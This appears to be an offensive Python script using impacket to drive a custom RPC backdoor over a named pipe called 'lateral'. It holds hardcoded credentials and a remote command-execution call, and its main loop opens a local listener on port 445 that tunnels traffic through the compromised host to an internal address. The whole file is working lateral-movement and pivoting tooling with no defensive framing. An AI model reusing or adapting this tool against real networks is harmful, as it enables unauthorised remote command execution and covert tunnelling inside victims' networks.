#!/usr/bin/python3
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import transport, scmr
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRULONG, NDRVaryingString, NDRCALL, NDRPOINTER, NDRUniConformantArray, NDRSTRUCT, NDRUniFixedArray
from impacket.dcerpc.v5.dtypes import LPWSTR, LPSTR, STR, SHORT, DWORD, PCHAR, LPBYTE, WSTR, LPDWORD
from impacket.dcerpc.v5.lsad import PCHAR_ARRAY
from impacket.dcerpc.v5.nrpc import UCHAR_ARRAY, PUCHAR_ARRAY
from impacket.dcerpc.v5.wkst import CHAR_ARRAY
from sys import argv
from os import fork
from threading import Thread
from struct import unpack


def msrpc():
    MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
    USERNAME = 'admin'
    PASSWORD = 'qwerty=123'
    DOMAIN = "."

    target = argv[1]
    stringbinding = r'ncacn_np:%s[\pipe\lateral]' % target
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(445)
    rpctransport.setRemoteHost(target)
    rpctransport.set_credentials(USERNAME, PASSWORD, DOMAIN, "", "", None)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(MSRPC_UUID_test)
    return dce

class SC_RPC_HANDLE(NDRSTRUCT):
    structure =  (
        ('Data','20s=""'),
    )
    def getAlignment(self):
        return 1

class DCERPCSessionError(Exception):
    def __init__(self, packet, error_code):
        print(123)
        pass

class Connect(NDRCALL):
    opnum = 0
    structure = (
        ('ip',STR),
        ('port',SHORT),
    )
class ConnectResponse(NDRCALL):
    structure = (
        ('socket',DWORD),
    )

class Disconnect(NDRCALL):
    opnum = 1
    structure = (
        ('socket',DWORD),
    )
class DisconnectResponse(NDRCALL):
    structure = ()

class Send(NDRCALL):
    opnum = 2
    structure = (
        ('socket',DWORD),
        ('data',STR),
        ('len',DWORD),
    )
class SendResponse(NDRCALL):
    structure = (
        ('len',DWORD),
    )

class Recv(NDRCALL):
    opnum = 3
    structure = (
        ('socket',DWORD),
        ('len',DWORD),
    )
class RecvResponse(NDRCALL):
    structure = (
        ('data',CHAR_ARRAY),
        ('len',DWORD),
    )

class Execute(NDRCALL):
    opnum = 4
    structure = (
        ('cmd',STR),
    )
class ExecuteResponse(NDRCALL):
    structure = (
        ('data',LPSTR),
    )


#dce = msrpc()
#execute = Execute()
#execute["cmd"] = "ipconfig\x00"
#res = dce.request(execute)
#print(str(res["data"], "cp866"))

'''
dce = msrpc()
connect = Connect()
connect["ip"] = "10.0.0.1\x00"
connect["port"] = 1234
res = dce.request(connect, checkError=False)
res.dump()
socket = res["handle"]

send = Send()
send["handle"] = socket
send["data"] = "test\x00"
send["len"] = 4
res = dce.request(send, checkError=False)
res.dump()

recv = Recv()
recv["handle"] = socket
recv["len"] = 10
res = dce.request(recv, checkError=False)
res.dump()

disconnect = Disconnect()
disconnect["handle"] = socket
dce.request(disconnect)
'''

import socket
from time import sleep
from sys import exit

is_stop = False

def incoming(c, sock):
    global is_stop
    while True:
        recv = Recv()
        recv["socket"] = sock
        recv["len"] = 1024
        #res = dce.request(recv, checkError=False)
        res = dce.call(recv.opnum, recv)
        res = dce.recv()
        data = res[ 4 : unpack("<I", res[-4:])[0]+4 ]
        #import ipdb;ipdb.set_trace()
        #if res["len"] == 4294967295 or is_stop:
        if not data:
            print("incoming closed")
            is_stop = True
            break
        print("<-" + str(data) + "[" + str(len(data)) + "]")
        c.send(data)
        print("incoming")

def outcoming(c, sock):
    global is_stop
    dce = msrpc()
    while True:
        data = c.recv(1024)
        if not data or is_stop:
            print("outcoming closed")
            is_stop = True
            break
        print("->" + str(data) + "[" + str(len(data)) + "]")
        send = Send()
        send["socket"] = sock
        send["data"] = data + b"\x00"
        send["len"] = len(data)
        res = dce.request(send, checkError=False)
        #res.dump()
        print("outcoming")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 445))
s.listen(10)
while True:
    c,info = s.accept()
    if fork() == 0:
        dce = msrpc()
        connect = Connect()
        connect["ip"] = "10.0.0.10\x00"
        connect["port"] = 445
        res = dce.request(connect, checkError=False)
        res.dump()
        if res["socket"]:
            is_stop = False
            incoming_thr = Thread(target=incoming, args=(c,res["socket"]))
            outcoming_thr = Thread(target=outcoming, args=(c,res["socket"]))
            incoming_thr.start()
            outcoming_thr.start()
            while not is_stop:
                sleep(1)
            #incoming_thr.join()
            #outcoming_thr.join()
            
            disconnect = Disconnect()
            disconnect["socket"] = res["socket"]
            res = dce.request(disconnect)
            res.dump()
            exit()
    else:
        print(f"[*] proxying {info[0]}:{info[1]}")
